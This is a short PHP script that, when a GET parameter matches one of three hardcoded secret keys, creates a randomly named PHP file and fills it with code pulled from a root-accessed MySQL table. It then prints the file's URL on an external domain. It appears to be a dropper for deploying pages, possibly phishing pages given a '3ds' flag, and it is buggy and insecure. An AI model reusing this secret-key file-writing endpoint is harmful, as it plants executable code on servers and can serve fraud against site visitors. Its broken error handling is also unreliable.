<?php
$adkey=$_GET["adminkey"];
if($adkey == "silammdjsadhasyd7ghyasdyghasdhsadyu8ahgyuıhdnahdsnGdsajuıdabuhjıdbnhasjuıbndas-pirotuaxa" or $adkey == "yar23e2ıjeıwqoejdaswdjmasjmdkjkosajkmdakdjmkoajmdjdıoasıdaHANCIafsdaıudhuıasdhbnjauıjsdhn-pirotuaxa" or $adkey == "sasdashdyqwydgwqf6d7qw67dgyqsgyudguqsghaĞchainwujdısjhduıahjnduıhsajnis-pirotuaxa")
{
    
    function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
function generateRandomString($length = 10) {
    $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $charactersLength = strlen($characters);
    $randomString = ``;
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$zaman = '

';
$yte = generateRandomString(5);
$sonuc = touch($yte.'sa.php');

if ($sonuc){
	echo "https://piroves.gq/ves/".$yte."sa.php";
    $myfile = fopen($yte.'sa.php', "w") or die("V-SER-1");
    $baglan=mysqli_connect("localhost","root","","vesolux");
    $sec = "SELECT * FROM xxe";
$sonuc=$baglan->query($sec);
if ($baglan->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
$ahahmysql = "";
while($cek=$sonuc->fetch_assoc())
{
if($cek["3ds"] == "1")
{
$ahahmysqlv2 = $cek["may"].$cek["ser"];
fwrite($myfile, $ahahmysqlv2);
fclose($myfile);
}
}


}else{
	echo 'Başarısız';
}
}else{
    echo "V-F";
}
?>